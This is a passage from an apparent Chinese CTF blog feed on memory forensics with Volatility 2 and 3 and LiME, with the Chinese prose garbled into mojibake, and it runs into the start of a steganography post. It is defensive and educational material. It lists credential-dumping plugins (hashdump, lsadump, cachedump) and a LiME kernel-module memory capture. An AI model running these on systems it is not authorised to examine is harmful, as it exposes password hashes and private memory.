é¡ºåºæ‰“å°æ¡Œé¢çª—å£æ ‘<br>wndscan             # æ± æ‰«æçª—å£ç«™<br>yarascan            # ä»¥ Yara ç­¾åæ‰«æè¿›ç¨‹æˆ–å†…æ ¸å†…å­˜<br></code></pre></td></tr></table></figure>


<h3 id="Linux-å†…å­˜å–è¯æ’ä»¶å‚æ•°"><a href="#Linux-å†…å­˜å–è¯æ’ä»¶å‚æ•°" class="headerlink" title="Linux å†…å­˜å–è¯æ’ä»¶å‚æ•°"></a>Linux å†…å­˜å–è¯æ’ä»¶å‚æ•°</h3><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text"># è·å–ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯ç›¸å…³å‘½ä»¤<br>linux_pstree        # è¿›ç¨‹æ ‘åˆ—è¡¨<br>linux_pslist_cache  # æ¥è‡ªçš„ kmem_cache æ´»åŠ¨è¿›ç¨‹<br>linux_psxview       # æ¯”è¾ƒè¿›ç¨‹åˆ—è¡¨<br>linux_lsof          # æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦çš„æ¯ä¸ªæ´»åŠ¨è¿›ç¨‹<br>linux_pslist        # æ´»åŠ¨çš„è¿›ç¨‹åˆ—è¡¨<br>linux_psaux         # æ´»åŠ¨çš„è¿›ç¨‹åˆ—è¡¨ï¼ˆè¾“å‡ºå†…å®¹åŒ…æ‹¬æ›´å¤šçš„ç»†èŠ‚ï¼‰<br><br># è·å–ç³»ç»Ÿå†…å­˜ä¿¡æ¯çš„ç›¸å…³å‘½ä»¤<br>linux_memmap        # å†…å­˜æ˜ å°„æ–‡ä»¶<br>linux_pidhashtable  # Linux å†…æ ¸ä¸­çš„ PID æ•£åˆ—è¡¨<br>linux_proc_maps     # è½¬å‚¨ç”±-s/-vma å‚æ•°åˆ°ç£ç›˜ä¸ŠæŒ‡å®šçš„å†…å­˜èŒƒå›´ã€‚<br>linux_dump_map      # è¿›ç¨‹å†…å­˜çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å †å’Œå…±äº«åº“ã€‚<br>linux_bash          # bash å†å²æ–‡ä»¶<br><br># è·å–ç½‘ç»œæ¥å£ä¿¡æ¯çš„ç›¸å…³å‘½ä»¤<br>linux_arp           # æ˜¾ç¤º arp åˆ—è¡¨<br>linux_ifconfig      # æ˜¾ç¤ºç½‘ç»œæ¥å£è¯¦ç»†æƒ…å†µ<br>linux_route_cache   # æ˜¾ç¤ºç½‘ç»œè·¯ç”±è¡¨<br>linux_netstat       # æŸ¥çœ‹ç½‘ç»œé“¾æ¥æƒ…å†µ<br><br># è·å–ç³»ç»Ÿç¡¬ä»¶ä¿¡æ¯çš„ç›¸å…³å‘½ä»¤<br>linux_cpuinfo       # æ˜¾ç¤º cpu çš„ç›¸å…³å‘½ä»¤ä¿¡æ¯ã€‚<br>linux_dmesg         # æ˜¾ç¤ºå†…æ ¸ç¼“å­˜ä¿¡æ¯ã€‚<br>linux_iomem         # æ˜¾ç¤º io è®¾å¤‡ä¿¡æ¯ã€‚<br>linux_mount         # æ˜¾ç¤º/proc/mouns çš„ç›¸å…³å‘½ä»¤ä¿¡æ¯ï¼Œä¸»è¦æ˜¯æŒ‚è½½çš„ç£ç›˜è®¾å¤‡ã€‚<br>linux_mount_cache   # æ˜¾ç¤º kmem_cache çš„ç›¸å…³å‘½ä»¤ä¿¡æ¯ã€‚<br>linux_slabinfo      # æ˜¾ç¤º/proc/slabinfo çš„ç›¸å…³å‘½ä»¤ä¿¡æ¯ã€‚<br><br># rootkit æ£€æµ‹çš„ç›¸å…³å‘½ä»¤<br>linux_check_afinfo  # æ£€æŸ¥ç¯¡æ”¹ç½‘ç»œåè®®ç»“æ„ã€‚<br>linux_check_creds   # æ£€æŸ¥è¿›ç¨‹å…±äº«ç»“æ„ã€‚<br>linux_check_fop     # æ£€æŸ¥æ–‡ä»¶æ“ä½œæ•°æ®ç»“æ„ç¯¡æ”¹æƒ…å†µã€‚<br>linux_check_idt     # æ£€æŸ¥ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆIDTï¼‰çš„ç¯¡æ”¹æƒ…å†µã€‚<br>linux_check_syscall # åœ¨ç³»ç»Ÿè°ƒç”¨è¡¨æ£€æŸ¥åŠŸèƒ½æƒ…å†µã€‚<br>linux_check_modules # æ£€æŸ¥ç”¨äºä»å†…æ ¸æ¨¡å—åˆ—è¡¨ä¸­ç¼ºå°‘åœ¨ sysfs ä¸­çš„é¡¹ç›®ã€‚<br><br># è·å–å†…æ ¸æ¨¡å—ä¿¡æ¯çš„ç›¸å…³å‘½ä»¤<br>linux_lsmod         # åŠ è½½å†…æ ¸æ¨¡å—ã€‚<br>linux_tmpfs         # tmpfs çš„å†…å®¹ã€‚<br></code></pre></td></tr></table></figure>


<h3 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h3><p>Volatilityè‡ªå¸¦ä¸€äº›<code>windows</code>ç³»ç»Ÿçš„<code>profile</code>ï¼Œ<code>Linux</code>ç³»ç»Ÿçš„<code>Profile</code>éœ€è¦è‡ªå·±åˆ¶ä½œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„profileæ–‡ä»¶ï¼š<a href="https://github.com/KDPryor/LinuxVolProfiles">https://github.com/KDPryor/LinuxVolProfiles</a></p>
<p>è‡ªå·±åˆ¶ä½œprofileçš„æ–¹æ³•å¦‚ä¸‹ï¼šå°†<code>module.dwarf</code>å’Œ<code>system.map</code>æ‰“åŒ…æˆä¸€ä¸ª<code>zip</code>æ–‡ä»¶ï¼Œç§»åŠ¨åˆ°<code>volatility/volatility/plugins/overlays/linux</code>ç›®å½•ä¸­</p>
<p>ä»¥<code>centos7</code>ä¸ºä¾‹</p>
<p>å…ˆå®‰è£…<code>dwarfdump</code>ï¼ˆåˆ›å»ºmodule.dwarfæ–‡ä»¶çš„ä¾èµ–ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install -y gcc make gcc-c++ git zip elfutils-devel kernel-devel<br>yum upgrade &amp;&amp; reboot   //è§£å†³kernel-develç‰ˆæœ¬ä¸ç³»ç»Ÿç‰ˆæœ¬ä¸ä¸€è‡´çš„é—®é¢˜<br>wget https://www.prevanders.net/libdwarf-20201201.tar.gz --no-check-certificate<br>tar -zxvf libdwarf-20201201.tar.gz<br><span class="hljs-built_in">cd</span> libdwarf-20201201<br>./configure<br>make<br>make install<br><span class="hljs-built_in">cd</span> ../<br></code></pre></td></tr></table></figure>

<p>åœ¨<code>volatility</code>ç›®å½•ä¸­çš„<code>tool/Linux</code>è¿è¡Œ<code>make</code>å‘½ä»¤æ¥åˆ›å»º<code>module.dwarf</code>æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/volatilityfoundation/volatility.git<br><span class="hljs-built_in">cd</span> volatility/tools/linux<br>make<br><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure>

<p>æ‰“åŒ…ï¼Œå°†<code>module.dwarf</code>å’Œ<code>system.map</code>æ‰“åŒ…æˆ<code>centos7.zip</code>ï¼Œç§»åŠ¨åˆ°åˆ†ææœºçš„<code>volatility/volatility/plugins/overlays/linux</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">zip centos7.zip /boot/System.map* module.dwarf<br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/misc/quzheng-1.png"></p>
<p>ubuntuåˆ¶ä½œprofileï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">apt-get install -y dwarfdump build-essential<br>apt-get install -y linux-kernel-headers kernel-package<br>apt -y upgrade &amp;&amp; reboot //è§£å†³kernel-develç‰ˆæœ¬ä¸ç³»ç»Ÿç‰ˆæœ¬ä¸ä¸€è‡´çš„é—®é¢˜<br><br><span class="hljs-built_in">cd</span> volatility/tools/linux<br>make -C /lib/modules/$(<span class="hljs-built_in">uname</span> -r)/build CONFIG_DEBUG_INFO=y M=<span class="hljs-variable">$PWD</span> modules<br>dwarfdump -di ./module.o &gt; module.dwarf<br>zip ubuntu_5.15.0-69.zip module.dwarf /boot/System.map-$(<span class="hljs-built_in">uname</span> -r)<br></code></pre></td></tr></table></figure>



<h2 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h2><blockquote>
<p>Volatility3æ˜¯å¯¹Volatility2çš„é‡å†™ï¼ŒåŸºäºPython3ç¼–å†™ï¼Œæ¶ˆé™¤äº†å¯¹profileçš„ä¾èµ–ï¼Œä½¿ç”¨ç¬¦å·è¡¨ï¼ˆé…ç½®æ–‡ä»¶ï¼‰æ¥åŒ¹é…å†…å­˜ç¤ºä¾‹ä¸­çš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€‚</p>
</blockquote>
<h3 id="ç¬¦å·è¡¨"><a href="#ç¬¦å·è¡¨" class="headerlink" title="ç¬¦å·è¡¨"></a>ç¬¦å·è¡¨</h3><p>ç”¨äºåˆ†æç›¸å…³æ“ä½œç³»ç»Ÿæ•°æ®çš„å†…æ ¸ç¬¦å·è¡¨å‹ç¼©åŒ…ã€‚æ³¨æ„ï¼šç”±äºLinuxå†…æ ¸æ˜“äºç¼–è¯‘ä¸”æ— æ³•å”¯ä¸€åŒºåˆ†å®ƒä»¬ï¼Œå› æ­¤æ— æ³•è½»æ¾æä¾›è¯¦å°½çš„Linuxç¬¦å·è¡¨é›†ã€‚å®˜æ–¹ä¸‹è½½åœ°å€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget downloads.volatilityfoundation.org/volatility3/symbols/windows.zip<br>wget downloads.volatilityfoundation.org/volatility3/symbols/mac.zip<br>wget downloads.volatilityfoundation.org/volatility3/symbols/linux.zip<br></code></pre></td></tr></table></figure>

<p>è§£å‹åç§»åŠ¨åˆ°<code>volatility3/volatility/symbols/</code></p>
<h3 id="å¸¸ç”¨æ’ä»¶"><a href="#å¸¸ç”¨æ’ä»¶" class="headerlink" title="å¸¸ç”¨æ’ä»¶"></a>å¸¸ç”¨æ’ä»¶</h3><p><a href="https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference">linuxå‘½ä»¤æ‰‹å†Œ</a></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">banners.Banners                                 Attempts to identify potential linux banners in an image<br>configwriter.ConfigWriter                       Runs the automagics and both prints and outputs configuration in the output directory.<br>frameworkinfo.FrameworkInfo                     Plugin to list the various modular components of Volatility<br>isfinfo.IsfInfo                                 Determines information about the currently available ISF files, or a specific one<br>layerwriter.LayerWriter                         Runs the automagics and writes out the primary layer produced by the stacker.<br>linux.bash.Bash                                 Recovers bash command history from memory.<br>linux.check_afinfo.Check_afinfo                 Verifies the operation function pointers of network protocols.<br>linux.check_creds.Check_creds                   Checks if any processes are sharing credential structures<br>linux.check_idt.Check_idt                       Checks if the IDT has been altered<br>linux.check_modules.Check_modules               Compares module list to sysfs info, if available<br>linux.check_syscall.Check_syscall               Check system call table for hooks.<br>linux.elfs.Elfs                                 Lists all memory mapped ELF files for all processes.<br>linux.keyboard_notifiers.Keyboard_notifiers     Parses the keyboard notifier call chain<br>linux.lsmod.Lsmod                               Lists loaded kernel modules.<br>linux.lsof.Lsof                                 Lists all memory maps for all processes.<br>linux.malfind.Malfind                           Lists process memory ranges that potentially contain injected code.<br>linux.proc.Maps                                 Lists all memory maps for all processes.<br>linux.pslist.PsList                             Lists the processes present in a particular linux memory image.<br>linux.pstree.PsTree                             Plugin for listing processes in a tree based on their parent process ID.<br>linux.tty_check.tty_check                       Checks tty devices for hooks<br>mac.bash.Bash                                   Recovers bash command history from memory.<br>mac.check_syscall.Check_syscall                 Check system call table for hooks.<br>mac.check_sysctl.Check_sysctl                   Check sysctl handlers for hooks.<br>mac.check_trap_table.Check_trap_table           Check mach trap table for hooks.<br>mac.ifconfig.Ifconfig                           Lists loaded kernel modules<br>mac.kauth_listeners.Kauth_listeners             Lists kauth listeners and their status<br>mac.kauth_scopes.Kauth_scopes                   Lists kauth scopes and their status<br>mac.kevents.Kevents                             Lists event handlers registered by processes<br>mac.list_files.List_Files                       Lists all open file descriptors for all processes.<br>mac.lsmod.Lsmod                                 Lists loaded kernel modules.<br>mac.lsof.Lsof                                   Lists all open file descriptors for all processes.<br>mac.malfind.Malfind                             Lists process memory ranges that potentially contain injected code.<br>mac.mount.Mount                                 A module containing a collection of plugins that produce data typically foundin Mac&#x27;s mount command<br>mac.netstat.Netstat                             Lists all network connections for all processes.<br>mac.proc_maps.Maps                              Lists process memory ranges that potentially contain injected code.<br>mac.psaux.Psaux                                 Recovers program command line arguments.<br>mac.pslist.PsList                               Lists the processes present in a particular mac memory image.<br>mac.pstree.PsTree                               Plugin for listing processes in a tree based on their parent process ID.<br>mac.socket_filters.Socket_filters               Enumerates kernel socket filters.<br>mac.timers.Timers                               Check for malicious kernel timers.<br>mac.trustedbsd.Trustedbsd                       Checks for malicious trustedbsd modules<br>mac.vfsevents.VFSevents                         Lists processes that are filtering file system events<br>timeliner.Timeliner                             Runs all relevant plugins that provide time related information and orders the results by time.<br>windows.bigpools.BigPools                       List big page pools.<br>windows.cachedump.Cachedump                     Dumps lsa secrets from memory<br>windows.callbacks.Callbacks                     Lists kernel callbacks and notification routines.<br>windows.cmdline.CmdLine                         Lists process command line arguments.<br>windows.dlllist.DllList                         Lists the loaded modules in a particular windows memory image.<br>windows.driverirp.DriverIrp                     List IRPs for drivers in a particular windows memory image.<br>windows.driverscan.DriverScan                   Scans for drivers present in a particular windows memory image.<br>windows.dumpfiles.DumpFiles                     Dumps cached file contents from Windows memory samples.<br>windows.envars.Envars                           Display process environment variables<br>windows.filescan.FileScan                       Scans for file objects present in a particular windows memory image.<br>windows.getservicesids.GetServiceSIDs           Lists process token sids.<br>windows.getsids.GetSIDs                         Print the SIDs owning each process<br>windows.handles.Handles                         Lists process open handles.<br>windows.hashdump.Hashdump                       Dumps user hashes from memory<br>windows.info.Info                               Show OS &amp; kernel details of the memory sample being analyzed.<br>windows.lsadump.Lsadump                         Dumps lsa secrets from memory<br>windows.malfind.Malfind                         Lists process memory ranges that potentially contain injected code.<br>windows.memmap.Memmap                           Prints the memory map<br>windows.modscan.ModScan                         Scans for modules present in a particular windows memory image.<br>windows.modules.Modules                         Lists the loaded kernel modules.<br>windows.mutantscan.MutantScan                   Scans for mutexes present in a particular windows memory image.<br>windows.netscan.NetScan                         Scans for network objects present in a particular windows memory image.<br>windows.netstat.NetStat                         Traverses network tracking structures present in a particular windows memory image.<br>windows.poolscanner.PoolScanner                 A generic pool scanner plugin.<br>windows.privileges.Privs                        Lists process token privileges<br>windows.pslist.PsList                           Lists the processes present in a particular windows memory image.<br>windows.psscan.PsScan                           Scans for processes present in a particular windows memory image.<br>windows.pstree.PsTree                           Plugin for listing processes in a tree based on their parent process ID.<br>windows.registry.certificates.Certificates      Lists the certificates in the registry&#x27;s Certificate Store.<br>windows.registry.hivelist.HiveList              Lists the registry hives present in a particular memory image.<br>windows.registry.hivescan.HiveScan              Scans for registry hives present in a particular windows memory image.<br>windows.registry.printkey.PrintKey              Lists the registry keys under a hive or specific key value.<br>windows.registry.userassist.UserAssist          Print userassist registry keys and information.<br>windows.ssdt.SSDT                               Lists the system call table.<br>windows.statistics.Statistics<br>windows.strings.Strings                         Reads output from the strings command and indicates which process(es) each string belongs to.<br>windows.svcscan.SvcScan                         Scans for windows services.<br>windows.symlinkscan.SymlinkScan                 Scans for links present in a particular windows memory image.<br>windows.vadinfo.VadInfo                         Lists process memory ranges.<br>windows.vadyarascan.VadYaraScan                 Scans all the Virtual Address Descriptor memory maps using yara.<br>windows.verinfo.VerInfo                         Lists version information from PE files.<br>windows.virtmap.VirtMap                         Lists virtual mapped sections.<br>yarascan.YaraScan                               Scans kernel memory using yara rules (string or file).<br></code></pre></td></tr></table></figure>


<h3 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h3><p>æ–‡ä»¶ä»¥<code>JSON</code>æ•°æ®çš„å½¢å¼å­˜å‚¨ï¼Œå®ƒä»¬å¯ä»¥æ˜¯<code>.json</code>çš„çº¯<code>JSON</code>æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯<code>.json.gz</code>æˆ–<code>.json.xz</code> çš„å‹ç¼©æ–‡ä»¶ã€‚<code>Volatility</code>ä¼šåœ¨ä½¿ç”¨æ—¶è‡ªåŠ¨è§£å‹å®ƒä»¬</p>
<p>Volatility3æ‰¾ä¸åˆ°windowsçš„ç¬¦å·è¡¨æ—¶ï¼Œä¼šä»<code>Microsoft</code>çš„<code>Symbol Server</code>ä¸‹è½½å…³è”çš„<code>PDB</code>æ–‡ä»¶ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºé€‚å½“çš„<code>JSON</code>æ ¼å¼ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨æ­£ç¡®çš„ä½ç½®ã€‚è€Œlinuxçš„ç¬¦å·è¡¨éœ€è¦è‡ªå·±æ„é€ ï¼Œå¯ä»¥é€šè¿‡<code>dwarf2json</code>å°†<code>DWARF</code>æ–‡ä»¶çš„å†…æ ¸è½¬æ¢ä¸ºé€‚å½“çš„<code>JSON</code>æ–‡ä»¶</p>
<p>MacOS Processing</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./dwarf2json mac --macho /path/kernel.dSYM/Contents/Resources/DWARF/kernel \<br>    --macho-symbols /path/kernel &gt; output.json<br></code></pre></td></tr></table></figure>

<p>Linux Processing</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-4.4.0-137-generic &gt; output.json<br></code></pre></td></tr></table></figure>



<h4 id="å®‰è£…vmlinux"><a href="#å®‰è£…vmlinux" class="headerlink" title="å®‰è£…vmlinux"></a>å®‰è£…vmlinux</h4><p>linuxç³»ç»Ÿé»˜è®¤æœ‰<code>vmlinuz</code>ï¼Œä½†<code>vmlinux</code>ä¸<code>vmlinuz</code>ä¸åŒï¼Œéœ€è¦æ‰‹åŠ¨å®‰è£…</p>
<p><strong>æ–¹æ³•ä¸€ï¼šaptå®‰è£…ï¼ˆæ¨èï¼‰</strong></p>
<p>å¯¼å…¥<code>GPG key</code><br><code>apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622</code></p>
<p>æ·»åŠ ddebså­˜å‚¨åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">codename=$(lsb_release -c | awk  <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/ddebs.list &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;      main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates  main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverse</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure>

<p>æ›´æ–°è½¯ä»¶åŒ…<br><code>apt-get update</code></p>
<p>å®‰è£…kernel debug symbols<br><code>apt-get install linux-image-$(uname -r)-dbgsym</code></p>
<p>åŒ…å«è°ƒè¯•ä¿¡æ¯çš„æ–‡ä»¶ç§°ä¸º<code>vmlinuxXXXdebug</code>ï¼Œå…¶ä¸­<code>XXX</code>æ˜¯å†…æ ¸ç‰ˆæœ¬ã€‚è¯¥æ–‡ä»¶å­˜å‚¨åœ¨<code>/usr/lib/debug/boot</code>ä¸‹</p>
<p><img src="/img/summary/misc/quzheng-2.png"></p>
<p><strong>æ–¹æ³•äºŒï¼šæ‰‹åŠ¨ä¸‹è½½å®‰è£…ï¼ˆä¸æ¨èï¼‰</strong></p>
<p>åœ¨<code>http://ddebs.ubuntu.com/pool/main/l/linux/</code>æ‰¾åˆ°åˆé€‚çš„ç‰ˆæœ¬åä¸‹è½½åˆ°æœ¬åœ°</p>
<p><code>dpkg -i</code>å®‰è£…ï¼Œå®‰è£…å®ŒæˆåŒæ ·åœ¨<code>/usr/lib/debug/boot</code>ç›®å½•ä¸‹</p>
<p>ä¾‹å¦‚ï¼š</p>
<p><code>dpkg -i linux-image-unsigned-5.15.0-60-generic-dbgsym_5.15.0-60.66_amd64.ddeb</code></p>
<p><img src="/img/summary/misc/quzheng-3.jpg"></p>
<p><strong>ä»¥ä¸Šä¸¤ç§æ–¹æ³•éƒ½æ˜¯åŸºäºubuntuï¼Œè€Œåœ¨centosä¸­å®‰è£…çš„æ–¹æ³•å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install -y yum-utils<br>debuginfo-install kernel<br></code></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾vmlinuxæ–‡ä»¶<br><img src="/img/summary/misc/quzheng-4.png"></p>
<h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.15.0-60-generic &gt; Ubuntu2004.json<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„å†…å­˜å°½é‡å¤§äº8Gï¼Œä¸ç„¶ä¼šæŠ¥<code>å·²æ€æ­»</code>çš„é”™è¯¯</p>
<p><img src="/img/summary/misc/quzheng-5.png"></p>
<p>ç§»åŠ¨<code>json</code>æ–‡ä»¶åˆ°åˆ†ææœºçš„<code>volatility3/volatility3/framework/symbols/linux/</code></p>
<p><code>python3 vol.py -vvvv isfinfo</code></p>
<p><img src="/img/summary/misc/quzheng-6.png"></p>
<h4 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h4><p>åŒæ ·æ³¨æ„å†…å­˜ä¸è¦å¤ªå°</p>
<p><img src="/img/summary/misc/quzheng-7.png"></p>
<h2 id="å–è¯å¤§å¸ˆ"><a href="#å–è¯å¤§å¸ˆ" class="headerlink" title="å–è¯å¤§å¸ˆ"></a>å–è¯å¤§å¸ˆ</h2><p>åœ¨ç¾äºšæŸç§‘å¾®ä¿¡å…¬ä¼—å·ç”³è¯·ï¼Œä¼šç»™ä¸€ä¸ªå‹ç¼©åŒ…</p>
<p>è§£å‹å¯†ç ï¼š<code>my#pico4008886688</code>æˆ–è€…<code>pico@4008886688</code></p>
<h1 id="å†…å­˜æå–"><a href="#å†…å­˜æå–" class="headerlink" title="å†…å­˜æå–"></a>å†…å­˜æå–</h1><blockquote>
<p>å®Œæ•´çš„å†…å­˜æ•°æ®åŒ…æ‹¬ä¸¤éƒ¨åˆ†: ç‰©ç†å†…å­˜æ•°æ®å’Œé¡µé¢äº¤æ¢æ–‡ä»¶æ•°æ®ã€‚</p>
</blockquote>
<blockquote>
<p>ç‰©ç†å†…å­˜é€šå¸¸æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å†…æ ¸å¯¹è±¡, æ¯”å¦‚, åœ¨<code>Windows</code>ç³»ç»Ÿä¸­, ç‰©ç†å†…å­˜æ˜¯å†…æ ¸å†…å­˜åŒºå¯¹è±¡, å³ <code>\\Device\\PhysicalMemory</code>; åœ¨<code>Unix/Linux</code>ç³»ç»Ÿä¸­, ç‰©ç†å†…å­˜ä¸º<code>/dev/mem</code>å’Œ<code>/dev/kmem</code>ã€‚ åªè¦èƒ½è¯»å–è¯¥å†…æ ¸å¯¹è±¡, å°±èƒ½è·å–ç‰©ç†å†…å­˜æ•°æ®.</p>
</blockquote>
<blockquote>
<p>ç‰©ç†æœºä¸Šä½¿ç”¨å·¥å…·æ¯”å¦‚<code>Win32dd/Win64dd</code>,<code>Memoryze</code>,<code>DumpIt</code>,<code>FastDump</code>ã€‚åœ¨è™šæ‹Ÿæœºä¸Šï¼Œè·å–å†…å­˜æ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä½ å¯ä»¥æš‚åœVMå¹¶å–å‡º<code>.vmem</code>æ–‡ä»¶ã€‚</p>
</blockquote>
<p>è¿™é‡Œé‡‡ç”¨<a href="https://github.com/504ensicslabs/lime">lime</a>åˆ¶ä½œå†…å­˜é•œåƒ</p>
<p>ä»¥centos7ä¸ºä¾‹å­</p>
<p>å®‰è£…åŸºæœ¬è½¯ä»¶<br><code>yum install -y gcc make gcc-c++ git kernel-devel</code></p>
<p>ä¸‹è½½lime<br><code>git clone https://github.com/504ensicsLabs/LiME.git</code></p>
<p>ç¼–è¯‘<br><code>cd LiME/src &amp;&amp; make</code></p>
<p>å¦‚æœå‡ºç°ä»¥ä¸‹æŠ¥é”™</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">make -C /lib/modules/3.10.0-1127.el7.x86_64/build M=&quot;/root/LiME/src&quot; modules<br>make: *** /lib/modules/3.10.0-1127.el7.x86_64/build: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚ åœæ­¢ã€‚<br>make: *** [default] é”™è¯¯ 2<br></code></pre></td></tr></table></figure>

<p>è¯´æ˜ç³»ç»Ÿè‡ªèº«çš„å†…æ ¸ç‰ˆæœ¬å’Œ<code>kernel-devel</code>å®‰è£…çš„å†…æ ¸ä¸åŒ¹é…</p>
<p>ä½¿ç”¨<code>uname -r</code>æŸ¥è¯¢å†…æ ¸ç‰ˆæœ¬ï¼š<code>3.10.0-1127.el7.x86_64</code></p>
<p>ä½¿ç”¨<code>rpm -qa kernel-devel </code>æŸ¥çœ‹å®‰è£…çš„ç‰ˆæœ¬ï¼š<code>kernel-devel-3.10.0-1160.88.1.el7.x86_64</code></p>
<p>è§£å†³æ–¹æ³•ï¼š<code>yum upgrade</code></p>
<p>é‡æ–°ç¼–è¯‘ä¼šç”Ÿæˆä¸€ä¸ªåå­—å’Œå†…æ ¸ç‰ˆæœ¬ç›¸åŒçš„<code>.ko</code>æ–‡ä»¶</p>
<p><img src="/img/summary/misc/quzheng-8.png"></p>
<p>ä½¿ç”¨<code>lime</code>å·¥å…·å¯¼å‡ºå†…å­˜æ–‡ä»¶</p>
<p><code>insmod ./lime-3.10.0-1160.88.1.el7.x86_64.ko &quot;path=/root/centos.line format=lime&quot;</code></p>
<p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://r0fus0d.blog.ffffffff0x.com/post/memory-forensics/">å†…å­˜å–è¯(æ€»ç»“ç¯‡)</a><br><a href="https://xz.aliyun.com/t/11800">æœ€è¿‘é‡åˆ°çš„Linuxå†…æ ¸å†…å­˜å–è¯å°åˆ†æ</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>æ€»ç»“</tag>
        <tag>å†…å­˜å–è¯</tag>
        <tag>æµé‡åˆ†æ</tag>
      </tags>
  </entry>
  <entry>
    <title>miscæ€»ç»“(éšå†™ç¯‡)</title>
    <url>/posts/b9152a17/</url>
    <content><![CDATA[<h1 id="å›¾ç‰‡éšå†™"><a href="#å›¾ç‰‡éšå†™" class="headerlink" title="å›¾ç‰‡éšå†™"></a>å›¾ç‰‡éšå†™</h1><h2 id="0x01-Exifä¿¡æ¯éšè—"><a href="#0x01-Exifä¿¡æ¯éšè—" class="headerlink" title="0x01 Exifä¿¡æ¯éšè—"></a>0x01 Exifä¿¡æ¯éšè—</h2><p>å¯äº¤æ¢å›¾åƒæ–‡ä»¶æ ¼å¼ç®€ç§°exifï¼Œå¯ä»¥è®°å½•å›¾ç‰‡çš„å±æ€§ä¿¡æ¯å’Œæ‹æ‘„æ•°æ®ã€‚Exifä¿¡æ¯æ˜¯å¯ä»¥è¢«ä»»æ„ç¼–è¾‘çš„</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">root@lewiserii-pc:~/æ¡Œé¢# exiftool 1.png<br>ExifTool Version Number         : 11.88<br>File Name                       : 1.png<br>Directory                       : .<br>File Size                       : 5.4 kB<br>File Modification Date/Time     : 2023:02:21 13:47:49+08:00<br>File Access Date/Time           : 2023:02:21 13:54:17+08:00<br>File Inode Change Date/Time     : 2023:02:21 13:53:15+08:00<br>File Permissions                : rwxrw-rw-<br>File Type                       : PNG<br>File Type Extension             : png<br>MIME Type                       : image/png<br>Image Width                     : 438<br>Image Height                    : 121<br>Bit Depth                       : 8<br>Color Type                      : RGB<br>Compression                     : Deflate/Inflate<br>Filter                          : Adaptive<br>Interlace                       : Noninterlaced<br>Pixels Per Unit X               : 5669<br>Pixels Per Unit Y               : 5669<br>Pixel Units                     : meters<br>Software                        : Snipaste<br>Image Size                      : 438x121<br>Megapixels                      : 0.053<br></code></pre></td></tr></table></figure>

<p>æå–ç¼©ç•¥å›¾<br><code>exiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg </code></p>
<h2 id="0x02-æ–‡ä»¶ä¿®å¤"><a href="#0x02-æ–‡ä»¶ä¿®å¤" class="headerlink" title="0x02 æ–‡ä»¶ä¿®å¤"></a>0x02 æ–‡ä»¶ä¿®å¤</h2><p>æ–‡ä»¶å¤´(å°¾)è¢«ä¿®æ”¹æˆ–å»é™¤ï¼Œéœ€è¦ä¿®å¤æ–‡ä»¶æ ¼å¼</p>
